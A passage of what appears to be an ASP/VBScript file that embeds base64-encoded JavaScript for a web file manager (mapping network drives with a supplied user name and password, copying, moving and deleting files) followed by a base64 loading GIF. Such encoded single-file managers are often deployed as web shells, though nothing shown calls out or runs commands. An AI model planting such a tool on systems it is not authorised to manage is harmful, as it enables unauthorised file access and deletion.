"O3JldHVybjt9CglpZiAoZ2V0SWQoImRyaXZlckxldHRlciIpLnZhbHVlLnRyaW0oKS5sZW5ndGggPiAxKSB7YWxlcnQoIkRyaXZlciBMZXR0ZXIgaXMgb25seSBvbmUgY2hhcmFjdGVyICEiKTtyZXR1cm47fQoJaWYgKGdldElkKCJyZW1vdGVTaGFyZSIpLnZhbHVlLnRyaW0oKS5sZW5ndGggPCAxKSB7YWxlcnQoIlJlbW90ZSBT" &_
"aGFyZSBpcyByZXF1aXJlZCAhIik7cmV0dXJuO30KCglwb3NFeHAgPSBjdXJfcG9zKCk7CgoJa2V5PVsiZHJpdmVyTGV0dGVyIiwgInJlbW90ZVNoYXJlIiwgInVzZXJOYW1lIiwgInBhc3N3b3JkIl07Cgl2YWx1ZT1bZ2V0SWQoImRyaXZlckxldHRlciIpLnZhbHVlLnRyaW0oKSwgZ2V0SWQoInJlbW90ZVNoYXJlIikudmFsdWUu" &_
"dHJpbSgpLCBnZXRJZCgidXNlck5hbWUiKS52YWx1ZS50cmltKCksIGdldElkKCJwYXNzd29yZCIpLnZhbHVlLnRyaW0oKV07CgloaWRlTWFwTmV0d29yaygpOwoJc2VuZFJlcXVlc3RBY3Rpb24oIm1hcERyaXZlciIsIFtrZXksIHZhbHVlXSk7Cn0KCmZ1bmN0aW9uIENvcHlNb3ZlKGFjdGlvbiwgdGFyZ2V0UGF0aCkKewogICBp" &_
"Zih0YXJnZXRQYXRoLnRyaW0oKSAhPSAiIikKICAgewoJCXRhcmdldFBhdGggPSB0YXJnZXRQYXRoLnRyaW0oKTsKCQlsaXN0Rm9sZGVycyA9IGRvY3VtZW50LmdldEVsZW1lbnRzQnlOYW1lKCJkeCIpOwoJCWxpc3RGaWxlcyA9IGRvY3VtZW50LmdldEVsZW1lbnRzQnlOYW1lKCJmeCIpOwoKCQlrZXk9WyJ0YXJnZXRQYXRoIl07" &_
"CgkJdmFsdWU9W3RhcmdldFBhdGhdOwoKCQlmb3IoaT0wO2k8bGlzdEZvbGRlcnMubGVuZ3RoO2krKykKCQkJaWYobGlzdEZvbGRlcnNbaV0uY2hlY2tlZCl7CgkJCQlpZigoZmZMaXN0LmluZm8ucGF0aC5hZGRTbGFzaCgpICsgIGZmTGlzdC5mb2xkZXJzW2xpc3RGb2xkZXJzW2ldLnZhbHVlXS5zcGxpdCgifCIpWzBdKS5hZGRT" &_
"bGFzaCgpID09IHRhcmdldFBhdGguYWRkU2xhc2goKSkKCQkJCXsKCQkJCQlhbGVydCgiQ2FuJ3QgIiArIGFjdGlvbiArICIgXCIiICsgZmZMaXN0LmZvbGRlcnNbbGlzdEZvbGRlcnNbaV0udmFsdWVdLnNwbGl0KCJ8IilbMF0gKyAiXCIgdG8gdGhlIGl0c2VsZiAhIik7CgkJCQkJcmV0dXJuOwoJCQkJfQoJCQkJa2V5LnB1c2go" &_
"ImR4Iik7CgkJCQl2YWx1ZS5wdXNoKGZmTGlzdC5mb2xkZXJzW2xpc3RGb2xkZXJzW2ldLnZhbHVlXS5zcGxpdCgifCIpWzBdKTsKCQkJfQoKCQlmb3IoaT0wO2k8bGlzdEZpbGVzLmxlbmd0aDtpKyspCgkJCWlmKGxpc3RGaWxlc1tpXS5jaGVja2VkKXsKCQkJCWtleS5wdXNoKCJmeCIpOwoJCQkJdmFsdWUucHVzaChmZkxpc3Qu" &_
"ZmlsZXNbbGlzdEZpbGVzW2ldLnZhbHVlXS5zcGxpdCgifCIpWzBdKTsKCQkJfQoKCQlpZihrZXkubGVuZ3RoIDw9IDEpIHsKCQkJYWxlcnQoIlNlbGVjdCBmaWxlKHMpIG9yIGZvbGRlcihzKSB0byAiICsgYWN0aW9uICsgIiAhIik7CgkJCXJldHVybjsKCQl9CgoJCWlmKHRhcmdldFBhdGguYWRkU2xhc2goKSA9PSBmZkxpc3Qu" &_
"aW5mby5wYXRoLmFkZFNsYXNoKCkpCgkJewoJCQlhbGVydCgiQ2FuJ3QgIiArIGFjdGlvbiArICIgdG8gdGhlIHNhbWUgZm9sZGVyICEiKTsKCQkJcmV0dXJuOwoJCX0KCgkJaWYgKCFjb25maXJtKCdBcmUgeW91IHN1cmUgdG8gIicgKyBhY3Rpb24gKyAnIiAnICsgKGtleS5sZW5ndGggLSAxKSArICcgc2VsZWN0ZWQgaXRlbShz" &_
"KSB0byAiJyArIHRhcmdldFBhdGguYWRkU2xhc2goKSArICciPycpKSByZXR1cm47CgoJCXBvc0V4cCA9IGN1cl9wb3MoKTsKCQlzZW5kUmVxdWVzdEFjdGlvbihhY3Rpb24sIFtrZXksIHZhbHVlXSk7CiAgIH1lbHNlewoJCWFsZXJ0KCJUYXJnZXQgbG9jYXRpb24gaXMgcmVxdWlyZWQgISIpOwogICB9Cn0KCgpmdW5jdGlvbiBE" &_
"ZWxldGUoKQp7CgkJbGlzdEZvbGRlcnMgPSBkb2N1bWVudC5nZXRFbGVtZW50c0J5TmFtZSgiZHgiKTsKCQlsaXN0RmlsZXMgPSBkb2N1bWVudC5nZXRFbGVtZW50c0J5TmFtZSgiZngiKTsKCgkJa2V5PVtdOwoJCXZhbHVlPVtdOwoKCQlmb3IoaT0wO2k8bGlzdEZvbGRlcnMubGVuZ3RoO2krKykKCQkJaWYobGlzdEZvbGRlcnNb" &_
"aV0uY2hlY2tlZCl7CgkJCQlrZXkucHVzaCgiZHgiKTsKCQkJCXZhbHVlLnB1c2goZmZMaXN0LmZvbGRlcnNbbGlzdEZvbGRlcnNbaV0udmFsdWVdLnNwbGl0KCJ8IilbMF0pOwoJCQl9CgoJCWZvcihpPTA7aTxsaXN0RmlsZXMubGVuZ3RoO2krKykKCQkJaWYobGlzdEZpbGVzW2ldLmNoZWNrZWQpewoJCQkJa2V5LnB1c2goImZ4" &_
"Iik7CgkJCQl2YWx1ZS5wdXNoKGZmTGlzdC5maWxlc1tsaXN0RmlsZXNbaV0udmFsdWVdLnNwbGl0KCJ8IilbMF0pOwoJCQl9CgoJCWlmKGtleS5sZW5ndGggPCAxKSB7CgkJCWFsZXJ0KCJTZWxlY3QgZmlsZShzKSBvciBmb2xkZXIocykgdG8gZGVsZXRlICEiKTsKCQkJcmV0dXJuOwoJCX0KCgkJaWYgKCFjb25maXJtKCdBcmUg" &_
"eW91IHN1cmUgdG8gImRlbGV0ZSIgJyArIChrZXkubGVuZ3RoKSArICcgc2VsZWN0ZWQgaXRlbShzKSA/JykpIHJldHVybjsKCgkJcG9zRXhwID0gY3VyX3BvcygpOwoJCXNlbmRSZXF1ZXN0QWN0aW9uKCJkZWxldGUiLCBba2V5LCB2YWx1ZV0pOwp9Ci8vLy8vLy8v"

img_loading =  ""&_
"R0lGODlhoABQAPMAADAwL/5NAH07HeVJBpc+F0o0KmQ3JLFCEvlMActFDL5DD0o0KdlHCD0xLIo8GthHCSH/C05FVFNDQVBFMi4wAwEAAAAh/hoiQ3JlYXRlZCB3aXRoIENoaW1wbHkuY29tIgAh+QQABQD/ACwAAAAAoABQAAAE/xDISau9OOvNu/9gKI6X8CAB4zRk675wDC5DYN/DIu/81RSFRYHVk9VuyAGxyHwFF1BooekSIK+B" &_
"wSAhWFK/m2c0OgWHHlgkQrstm9+UxnhhMAgEBh28k76yt157YGJ0d4Z4ght9SX8CiW9idod3dY8YaItrWgicB12WTU+Sk3gGbqASVpkDnK0JCQqBqDCikw4EBwQEjrMTR1hrra6vsb0ycguTuLm6u7KPNMCbwgivr7zGtMmGy8y6d9kAJjac08Jb1gfhMQWSDgfwzd8CeuENCWzU1dYMA/EG61psWyaPgANKAQEUwMdK2ANrbODFe5Zw" &_
"Q52CzQ5VbCBAQSt0r//+SIxXUYQBjPAUKMhVUoIBa/zYJBgJD2DLDwLkqdypckXLAzAZaqFJ8qaHbQIO8FSZy0HLBkAhalk5UkGCBwZtGtVwh8BSlc20VjQQdQtNBQ8YqG3mcysGjkqXynPqtpvEtGoTzHWrIa7VB2ln6uJLtqpatd50ieVLoVmCw4f1Mrb7OC9Guowr5KwMOS/jBt3w6sVIILMFsp0hK1hs9OSBh4kLmragILXaByxn" &_
"5yS9jFK9zK9TP6A6G8BJ0mAnUfyp9CqD4SOLA7hVcCcpbHy7CTVbungD6rriHiT1eytZBX8aSXe5O9d1hJkJpP9TbP2E9xozC5iv5Zr9++9RV8f/KTcB1Q8bDKTzH3ukyFNHJVsFJWECCwKAFDcZPQjhTRMGVaE4h4BHgIYDGhXVY+fM9CFHGCpG4oYlvXSCPghgt2Ah37z44FYe0VjNcuvpSOJWDviohY0VCqlhEEOUhF5D5cj0IQXt" &_
"6OgbGRXxl96UFFh5xxxCJDQNOZpowWWXJH4J5gJAPpIACldoQuGZE1T54JpSBPRLnAMgSadCeEaxjip9KPGnBYSsuQ4mhR6KaKBhhrPIDY5WgAyebQoyqQ2VVpAolotOykCnnoJJoDGEpoEZqRL8wGSmluyZBKysBhSNH+XVytg4WbSl66/ABivssMQWa+yxyCZLpwkoqECr/7IZuCrEsxncmkSu0Hrw6akhyIoDtdkCuia3HqSKxarh" &_
"bnDpmtRyhB6cfYyabgeJ1kEJaxksxMamAcxL7xijGIKvBff8wa+/HERiS0bYGncAA1GyIirCYUARcE7xhKeAQbcolRc1Ei+CLsWWWnwIQVHt9Nhwf+gTMhaGkpzvhe/EY41KWqiVXgAgv4xDwzLXeXI8J1qVM8Rl0jhmr+D6O0rGMD05gFoRo9DzkUGDYKc8USOIdMtXJ9C0zA9yTYzUVJdpTpQJkJu1BvY6BgvOR7OSHoprcDH22+00" &_
"45fRkKWXIDF7vx2HIX9zxrJMhBsuAx3vrKTLylQ99oonhTuegQ0dujjQcS4Day46KhEAACH5BAAFAP8ALAAAAACgAFAAAAT/EMhJq73APRTYUcOQCA1mnmiqrmzrvlMxBHSNhGFSwHzv/8DWrEa8hRCIxEEQbDqfUIuDSA0gryJlKcrtelOPKvWKTJgP37T6Kx6TzQzRgWBY2++9dvGNGxz+BFt4g4QYYXpWZH1+f3OFj5AZiIlIi4yN" &_
"dZFrDQWdBYJ4Q2JkRn2NgJpqnqs7gzJVpAgPi0p/CgkPBA6ZqVCsrIUaNH4glWaLjQ8MywTNDqC9P5y/ntCQDQdmCX0Kf8rLCc3O0U2sCwYGAuq8vQbZcbUfy8tz4nTkQKsL6vzr+BMETiWYF86ern8+PO3rxw8dwgYBvYEzaEvdAoQvPKVjuM5Aq38G/wI+UGJQgUkF/axhNDFtI0N0DldmMEjgZDeGMld04tgx5sqQ9j6cJMDwYs4U" &_
"BRg6sCeAHcal4oTe5HhUhcuABp/lbAC1pskDDnhWRYqOpjMmRw0s7UaU41KYH8dWSGe2rdGqLhmKg+lTLoWuTPnJXai3WVO+Tv0KABy2n2KlexF79EuhX8Cvbf02KExHcl+/6RxIPbmEMoBz6oh6hmlawr7RNgm0nrAanbpOKnM6sMn73uzV/VZR3s3b5LjZBST38yhcbjNbmMXNlqCc3wJWuRHWtTedOsx+13/JhZpNGcmD3QEk32gg" &_
"vPixIQfOm5h4OjVgcuXPB5fd9P3meB3wzf98DxxQ32zT3NcfPhHdoswD3TiSHgX/xXXUKRg2MmEF91HWyDY4xLNhBQl+YlpNloSggGwjtmhAijgc2GJrAsAYAlozTpgNjErkuKE2ceDAgDY+TqjNkUgWmV42AylyhpLdGbBBLLLgCKVpDQxA5Q0LXrlSjVsOYKWXcoFwBBY5kGmajTioSZmWHCSyiGkacMCAVi0WEGcRIfr1ChUDWNid" &_
"KGPc6BehRAzQZVVT6JHEor002oYDGx7SBgKCymSpGAxsOEkAYwkAwqeeTnJUASAiKkaliHSaU6patrqhpGJQKlONfexZ64iqDgPpI2bm2oaiI/6ZaKbtZFPJIroOg+zrdMIEMACe/2CjjSK5xjntr27ewaQZpFiSQLcgBbTNkHBg28eY5F4T0QF9XKuuCNy220KJudGFS4S04KKuDvZyoY9tfC0GyAHzFLgIuk3ekAC1ATuhD2einaQf" &_
"A7P0qw0aEXORIGGpRWXTAPtlHOKR7HYcxCp5iVaPGSeFQKDGPaocBcuWAUIAzCbJPF+wWWhh882eMNRIMzzfQvJ8f2wzUmlDE71TP0fvnMDIBB4d9RcJ5oXVc1fbpF+EgWz9hUb9iGYPb3OUN4eMZktcAMgCZCWVOBDHnQYnC8EkDj9f76L3I+sVbNHgiF8ZAQAh+QQABQD/ACwAAAAAoABQAAAE/xDISautQo2Rzkmd0FxkaZ5oqq5s" &_
"izoPEiDIRiMPyDAeYbjAoHBIXC0GgaTydntsNp4DYVSsWq/YClLJnTGfnIMCRHD8sui0uuTour/gx45HKFPX+Lz14e7SkmAIcwwJdWV6iIlAfX4yAU80gwyGPoqWlyWMXH81NoKDdVECBguYppd8ml4zkAODhQqxCgK0Iqe3eW2qN4GSYrKztQK4xGpbfU1xr7+xB8ICpcXSVkdvYR8JhGJzhcwKBM9n0+NEMIAOdxQGBAc5UgTAzrUO" &_
"dQYGBeT5eQ30dbIHDmpRsmdPn0E1BgSwkyKMkg+C4g5KvLLgWb86oyDim8ixyjOHEP8JdgzSoECBBQXS5WvQ0FBIewJOphyp4uSCmzc3HlyQEOPLWjhR0jxhM2jOji9h0iIVVOfQCg2MGlWpr0DSWkyDUn1aVKpQjj+BSnX6VEJXryNDikVblkJRpfZu0rQK0SvOtm5vJnwWs+1Zo2TLRt3LNyLNqHYXbH1KuHDgjn+P4lXHd2lBv2Mn" &_
"VyAoLOTkkjIXt4Wo0FBGzahLEHToMrXrClZZm35NW0Jp2dBqv77tcKlu17QulhH2O3XlZ8VR72XXDNyo5JoXOPDWzEE06Hip/xONfeI6YMAqdS9b2sO/Og7Gl5XtUDcMGQzQrQ+VQE4HQ7SrdRlwfaTCbJIUkt7/a8fsx10+BgAoCSGGTaYLIwOmJceCDDzQIF6pMMLAUOxMOMgDUrymShJDRTGGHA8oEIVmGWwwYgAlRiGjjHgVkEAg" &_
"qmxIEzs3PtFBD3j1CIkqEXYkABhgqHghR0ciOYAjbgxwIDkHOPkEAXhpYCWUSvA3VIJCIjlMW1ZC4sgA8pUIQjZgaMPYB7yUqdmNX6wJwmHYJAAHkglMVgATTORw50h50hknGGO2pSegN4BwQFp2ggAoGAlMaVCTjNLAQaITFQpCDIcm8NhIWmZKwwGW3rJOla5EauimqRr0JJeAxopJAwuxuoGrg6K2AJdLaDpRrrruGumjqRW4ya4S" &_
"GTBj5piE2MkpXg8iM8C00vRUn4pR8LkmqqlliEyl5PBjyIQgmkepo7Ye9OKotwjnYboe9BhCu+6OOA1PCqloiIIMcBsFlrqJ64aOuLBUCzOhfDjjkppV60aReoCGEk/rDJdBeAQALCPBvynbJb5CdEUYJRuf1/EcA5PckX5ceJmIyQI5RJ0h2EgBMW3mPJImIojpJUwPOIMHknrF0LzwO0XLQgnFSJvS1UdMo8cwei5HfcXUwkzXm0I9" &_
"mKF10kE1xhtGtYw9TtD8fmRIQLRkrTYaSltWGi39zS2N0p7pfZDFJ2nk9+CESxABACH5BAAFAP8ALAAAAACgAFAAAAT/EMhJq5XmpHQIOZ0jeI5xnWiqrmzrvnDaaFsy3MrxMIlHNrGgcEgsthoCBWI5sN1uOwbPAzoIDAujdsvtTgrOpfg5QAykUoVaTRC4gd64fH5phMWIgPm2RKfXVm4CdISFXQJPeHl6fAhoOGsKbg5tBgYFhpma" &_
"LgyLAXpLn3t9UpBrIz6WlpusrRMLA5+yop6NjwORHT4Eqquuv4axs7OhAXxnpQm5u7y9mMDQcQLD1Hl7A1F/arq7vVcLBXDR40QP1MNjuDo8B4CUu1cGggIL9c/k+DDn6AgKVCGUcrRBlUrevHr28ilssW9WgnsWkAjqZmkeFoQLxC3caMFcwwEa/08skEcpnkFBFxFC5MgSwLSGDmD0OvkNY72WOCUIowYyhjc3KW3mxAmLZ5YgBSpa" &_
"sqlyaE4BHgc4CBmkAVOMVJ1qJVLgKritYLd0tbkyrNmqBbqGO8u2rdu3cOPKnUu3rt27eOk0SAsua96zYzGW/Rs2MFnCbK16zYiYAtQ8DKZyNMx08N2iwwYcVUiZaWMAOzP7BTa2YjyEjV/ui8l55DygXxF73MdgYQOaFkfTbShrYYHXry3X5f1poWngvuwiUcCHd22FP4GquguGjKdzrPPN3G6irh0yNz7qdqWKYKXkcxGBD290Y1Jm" &_
"qYS3Zb6+0Sep44G9g0/gbn3wQy1gHv88m831HxlDGbQfASJcIVcGGxx4QwJDAQccXDPUkEAn14A3yFMjtCPQPHDRoGE6ZCSQ3zgCiJiLCN21ZYCGNTzARIry5UNAJLnQ85aJNG74RAICrDiOATvyuEZ/bwUZpFmoKKlGdmYhecANPDhJYVi7gACIB2c18AEIKQZ5gFlUJLADB7ucNSYITkxI44dgObChH1MwWGUVVZCR5QYHGKnQAXii" &_
"0UOMW71ZBX1yciCodusUysCZWsnjgTJ8VuEEB0W6CUI2aDzAZE4NLLjDA5ny+eOiajLwQA6U5rQgAXeimuqobGmQYqYJwkdoGqkialYDDNQHK64sDXipFLZWgaz1WYT+B4KwCrm2DXx38knAoxvNGCd4PbAkkRuR+MpBB9SGZYci4DHArSavuegPM1S6BYYiN56x5UYCzpPktd3E9R2+S2jomyUkzCPvLvW2dcB17AIKnSrwTOKiD5K9" &_
"hRk/YmxAJzB7uUZxxW584E8JcoXGMQKORlOaRfS+lm5bqu0jRqAuI4TbgK8VCNdsNjvybheK1YMcM68NR9wNH/9imIVI+jDP0DgRZ4yK4xi2c0UeuOGzXECf8xA5WiOnSo5v1UyNAlR7QRluvSCmsiw94VO0zihNh9jGdH+ds01KXfKZBFDdl7FvlQ2eGF9rKe7445AjFgEAIfkEAAUA/wAsAAAAAKAAUAAABP8QyEmrpUYQ4kT2yyWO" &_
"ZGmeaKqup0EcT3JsinJ0guMYfMH+wKBwmGq8YIxkola7bTY8HnFKrVovR0UyORgwbU+CJ2NYFBrXtHo9Mii63S2ju1QkEmGxYG8o+NmAgVQNBwlwAwgIW3A1d2EHe3x+f4KVlimFhnCJinNdjXhPkJECk2eXqKkVBneaXZwDnl52oS96kaY+qruWDQmcia+cso0zGzekfaa8zIAFv8ABCMKdA3UKeaQeuc3dV76I0dLCSQ9NDmHaAmbL" &_
"3u5EAtScAeN0eDh7Yjyk7JNo7wCBvJEH7JMBEQX28eg3KaBDFuHo0QOGQMa/ErkaPtx4ogACiSD/gR24aKKBKZIcU14YALJlIgYoVcoc4qClywECZuqc8sBmyAQxdwpN4bOlrqFIVRQFmbRpip5LGTgF4ODBRwYOgiKtudRB0wIsWw44OjWszQFaZZoVm3Yn2LNkhXIt6nXqhKr0BmR1CrWoVLuALSyVGDhwAwFvBtMrbPfZpsF/GScF" &_
"97ir5KbxDiEqivZy0oGaP4qN61mn5kOJ8u4tjfT0adZIDWRyfSgB7J2EWiVgEMx1ztszM+mGpRkocJmsdN+xOq026WYm/R0HIFz5bjgJVr/LSOm2descuWuE/V35xuji2zZ1cQBJeRkbxbcrbKR9e03lfzuUPz7wEfsHYKfc/0jx8ffcegDaNxADuhFY4AL7jMEOY/8lWEgMMgigHnQQqrPOhjtZaKFQH6hzEGAZEBCDDSIe4FaJ2vQx" &_
"VQPobLAbA+ZYSMBOUcDY41Q1HrPFAxaeOFOPSEbhlAt53MgAi+3tyGOKT4whRVNBhnGjDFGC+A6TeRCgZFNhipIAkWIipUGZYh7IUYeIGcNmUwusWaZ+Mx1GygE1sFlXbPncKZQ6BDBRppFDkZIlDjvVqQ6fYITxp5ovNHHLHjx66ACkknrpECFfnMOHTAkxiQ8ptnCA6FaQhjpKCCn1mI6HgTEZqqF4PoRkNjH6d6YSrnqqSqlR2MmB" &_
"NrA6ZcQDcsTCxNUMKiUJ5gbaAPYCs3IwGMZ5fvCxa5WRCKvrfdkmYcyk202STI9r7pHsVAMFk20oq3qTi49J0hfgJi/JwcGn967bo5tDFRJav0lol64pcHo7pl1GpNZbOLEQWWAuDf/oVFUfUTSRZu3V6454EJIh41drSZTax3BAe7F8gKUckmj1DECAuJegxx3OAc1V1DzN2aYSf4D19TMwd+T68nxTKSYN0g7KpDPPDzlNUdTTPWS0" &_
"TyJRnXUlPtvUnDVef12JzCxbQ7DZ9soctMJsc4RXAHqVHbdkEQAAIfkEAAUA/wAsAAAAAKAAUAAABP8QyEmrtcVos4ovzSWOZGmeaKqu52IIBCFoQt19bK7vfJ83NVgsFrR9Cr6kcskcvQ6Kw3BaNBxDzax2e2o4CFCFIpEYHg6OoPXIbbvbX7B4TI6dZcEj8s3v9wxDc3QJUmcHRXp+iospBAkPDAMJYmR1hmqJjJqbEw0EkAyRAwOD" &_
"ZWB4M1ecq4xgoKKjg3ZpRjist3wGZwmhoaOSdENBNx64xm4HowgIA72/YkMaxCDHJQIPCAEMDljVJA3Jv8sIzqSHC94qBQMB7e4De+kXBwm/ysu9293yJ+zu/wP28QNggIy9e80eHBiYQsC/hwEcMJxAj9fBX2cMTDzxAOI/Bhv/AfBaFmDZQSkhTXh8uLHAOJIl7REQmHKCAAX+VrbbmODluJiSal4oUE+ZTm0TBdzzySyBAKEWihrV" &_
"KZEhzgFMxx2gWVPpwWweA060lxUB15pXv0KEt/Hiy1FQLVwUB3YAt5AKYJr8lSCuBF09mc2FW3MdRMEDnkIFV+ntxb41cz5sepZhRTIMHNtTHNKhTrZQC1Yio3lUgsrpOuoEGfdyJWzj+MYLeXRn3NG4MzcVgFpe7QA1AZ1phhu3XwmqV7Ke6MlQOEnFCR0H4Hll1YlgnEuNztmvZIC9celyPnwUA9xbpwMw/BA0dvJn0o5Or17CtXZ2" &_
"wxuDrx36If31TcQf/3kBBvhCDGIMiFKBx3kxxQEMKMSfRgz6FccUvEjoHAEV+gXIFEPwEoUhM3UYlxAg2jEiARSaCFWKKbrolws3RQFjDDIKBUQQYSgA43U5blQEDIKk2GKQDC0wpAA9SjEEkEgO9MKQDvT4JIBRrrJkEHIQ4MCRzKlS4ZZDQqWHLdNloIEDtGwJ5kRnsnHcBjQQsSU6KTUQ5wdYVkPnBsIsKdSecg76J6BeDtnnLQW4" &_
"MKU0aAZ36AYCtImnUDQueUNNehZQw6QbqDflnbMxdEQVk6Y56pIGLLqJHqumOueqQ74pT6cfxPpnqUJR6mZIZ2b6KZ3qoZjosLamE6ewxDZobN80zcK5LA0a8CpUDRdOsYG1yhJaTH1K1gDjDMmmg2ucrqZTZYJOajsoofV5IcgcU0AJbJwBfjFvgkX4dW663jjwiGnz4lFulsZ4wgsspMxxiACXIrzJNdno81c4zPjyzBw1SMwJe/8w" &_
"sxdW+MAyiRi8ebzJdyFnI/I4GjfMocqaVLcSWD4100sMB9PMRXI3u+NTPl76rMlvYMUEcygJ3GX0IkgnfQ8kD9j7NB9AewRTAPbccXXNtf2EGCElfs0Iy0KXxqLZr7L88jhk0Mc2J/eVhBjJCqU89zE3maa3EhEAACH5BAAFAP8ALAAAAACgAFAAAAT/EMhJq52t6NKu/2AojmRpnui0rUXqvnAsu4Uh3MbCznzv/yKD8EbUbTrApHKJ" &_
"EtqIxRVz6nE8EAGGA0mFGQhgggMqMEi73cIgwG4PWmhUQxAmHA4E8jnOXLf/A1x8Izd1d3hQe4NADn+OAQ6LIwuFhndjN0eSPXMKA1iPbQybIQ4HCgkJeHZ3eZkapDMFCQO1oY6xFw0OCr2pqXiHOLC5MA20tX63bMUVDgS9vr9hB5mCzSgCybWgt6PYAF920ajAYQbgMZ7b3aGR4HTj5NME6OkpBgcJCAjbn7eB0tlJ8KBWAnIKbtyT" &_
"oy8VP37sHr1Jd4yBRQbJyAm4tlBEQ4cP//sl48dmwJZ7BBJctJhRAYGOJwz8SsUgpL8BAmDmU7ByJR57MEl8/BVSpEGO2Fg96GkxwbugJGb+uvIwWQI4HQ8dWNrzAVKoFb4cqMVAqkqICTZC1efP4gMFB8CCaMBqrFWzceU2wHgTLh65H+qyvTszp9wDfG/eAQqYQj6tdsnOPPA1nUxkNxO8bGxB8J11BoFVTvfx5gAGo8FC1opMlVrA" &_
"UhOfTsB5gg0wB1drrS2Bps2ZtXfVUflA91/eB4o+fKCq9jNDbnUzBrxX+cO0nMXVSWnR76HNtbVZ5+eVc7zt3FV9T91x3XjanNEbUl+P9wR/NmvVlr/dvgXT/si1wP8TrfD3lH8SuAcKRAPAB9McUEDjknzT+SfeI/0YBhMZN5wyYR0HIghAA+38gQB7pFDCoSlwgYiiXI0sE6JlHBJhBxgOVCjiA8tkEVSNZIgIQo/M3FODOJjUKOQH" &_
"RAZwjxPaucLhkh7wuMw32EB5WxgcLkDlBTHeMiMpR0IJYpBfXqCMIwFlqaUQdUDxon9qSIRVM286Ec8NXqYJghUlnWRZnlD6KWIGGhBaqKH2sfAEoXcyChgLBahYxpuSBkdppThomWltm2owIJSRfgpWqIqYyhmqG6jaKKulugoWoqHOKSs2rN76KqW6+kcrB4euYGuvuG5K7KqoHqsXq8MqO8jzkUTkkKqz6QBpRKzUFvNEjUZk+4MV" &_
"WGgxbA1AlkGMtzLUySa2FyzwnBg1AouuDGsCwh6E1CCix7wyhBkKAml9tRMqq7SCJr8wWHmLSAx85NdB0fxSMCZCIBxDk5/wg9kAS9UiTSp1OMGuxSM0WdRICCT28Sr1VEzyCwovnF/G20BMT8svw+Avhg+VxA2DHkuD48g5j1BvG0X5nLFRAyDEZ9ExqGvi0lgY9ZDK0VSjIdQ6W8lgSAFYzQ9LTUeTR7Nce3AMflWxc1p3Hh7QZ9o8" &_
"zMIOeTdxpRmOaNM9lwDrEPTLNnChgqOOfgORzy9+1Ze4pBEAACH5BAAFAP8ALAAAAACgAFAAAAT/EMhJq704682798KDBIzTfGiqrmzrTsUQzPRQvHiu766gDCOacHDiGY/IXCExAAqfAUdS1ShYC8WpdsVsBqEzxtZzLd/GaI6g2QQ/0xqzGU6fGA4JBILtFtYtCwYCAgYGC2VZf1oNeAl5entfYGKKEoKDmAKHV5VbjY6QkH1RnYWZ" &_
"mZtnnUgGjq6homBElQWmp4MGnKs8BgQHTQyuQKFOTzaltre5Vrs6Db4Hv2yvxMMzAyarAgTcBA63VonNLdDRbE2OIpDTqp0N293RBKfM4y930ebnwY7DAwkCxFUa1I2bPEy57OEoF63LNFcAFQJYMMhBQYPfNElcIYhbAgX5//Q9dHRA4KpL8C4SKLQxRQOL3R4weBDyx8iSG0+pXNkyBcxuCRjMDIkH3YGALbcdUADyQEEpPT/0unhA" &_
"KIOmIQ1EBcCIqVeQGbVu7ZCyYNChIQmMdbD0K9OjGsdy2OlRaFqT9qa69TpProZAPkDuxCNP7NaUe0HilfsOU1sFO6H6BUD1sdPJF3R+VWnYr8EEMhM47Ya5AsVTlp+WBuDgrNVg3CSvRomJLd/Yi3tWfW01Ac/VEm5h8gXZQefJd2Tytgt8gvBTzSVAU/76gdrStQo5yCj8eOmaoGc2LV2oPLznC6IDyOfwXz7M5eN3E66ess1zTSBP" &_
"zh6/UOxTucllAP9++HnXU3/9CcBdevUBsAaBbAiAHIL9NVhBURCKNlYVBeBCIUsWTuAKA/u4slUZKH0YoogQtehIVGbQhmA7FjYyjB7/aNgShygiVOGKlqgDCwIPSNiSHAUA5iGIQHJ1IyyzHIlkdoQk1GRwTxJj5EZTlnFlBfdV809PXerypQQQ4tcTj0gG2GCa58DY5ZkU2KTHDDiOKaccdFKwhiR4DrDlmoj0SUEDgNKAgJuG9iTA" &_
"KLI1itkDo1AiaWmjzHDpapkGsGlplPZh6adyPdpHpKRuJYMsjKbaTAxQHOMqZiFck82suOaqaxohjFBCq7sqAqsxNAZrz6qxAmssGqa6ger1sp2E6sYeACkL7RGdstMCm9Zem+003QIw5bUoSAvGHmxQe1SrZZILwijohuIKTnFcUkgq4bjbAbJPxCvvvIslgwm+xeprwbBCoJvliO5589PDt+BrMFmh5pklAv2wcUBobZHkyzyZLFPP" &_
"xGThB2V7A1A3AFOuQAMyLl6S7EF7sAR1DgJWoaPAvNBwJ8AV4bq7RLqQPIDyADnnB5HLmZgpMwh25nh00isvDQ1CIz+twicov8bGzi3Ph0vQWnP1yTk7U82yIwWVVzYOd9gs2lJJf8TyaPMw+XYODKn81QE/Wbm3M30HYxl3ZA+uQS/ybNfNgoqvGAEAIfkEAAUA/wAsAAAAAKAAUAAABP8QyEmrvTjrzbv/QCMow5AcDxIwTgO+cCzP" &_
"tGYcyVPuauD7g0JtSCwaPwVcIoFoIga932/gOlqvWJkyAXVGpT9HdkwuAwwE3ICx9H7BPoZ5Tqc10ofDzuSGw+uAgR14eXtdTn5ggouMBgJpCQp5ent9iXGMmXQNDgSeCQwMD4WVlolimqljnZ4ED6GiaqWIiVRzDQW5BVWqY2itrrAMkoYpTlBwQXO6zEK9WaytoLAnJDtLeycPQC3LzczPRwuOkgetB8IMk1wPJwK8i7jfuvDhMiIC" &_
"+Qr7CtLCk+bCzWtmr0a+gwf49fsU6kQeAvU0FTDgSABFggVlLDiYj4BCc57/cEgiYKBgRY4CFujKKOMkQn4gPaHK6BLlSpYwUOZzkHBfq24ZJ9Y8aGAXTiQUZepM089BSZwUh+YretRD1F+edFqsKuGqVgFcOVx1BEzngrAUH/2c+jQsBqFXgTlA6RYrMJIU3WYYG7XswYgs1d71RFXvBb5R1eY763bj4FZgDU+QV8Ai4qiSz3R8HFly" &_
"s4qX2+rlGI3A3M56v51E7MzwV46SKesax3ZsZs1MRxL1PI+2Zcy3byjcd2Au49QDx11tndnBcJio3Q4Ed5vCr+f7REufnqs6hWh5YJrOLPsbYMmP797m7p3CuRxsYlYf2P47gWnCEoyvLvt8cPzpJKBd/30EdvVKOqE8MGCB9aVxoDCjEMDghABMogB8D5RzAIUMAuThJBwWiAcX1zwUIoEGWGPIAAoseKJhDTCwYgkM+PciWiSumEB0" &_
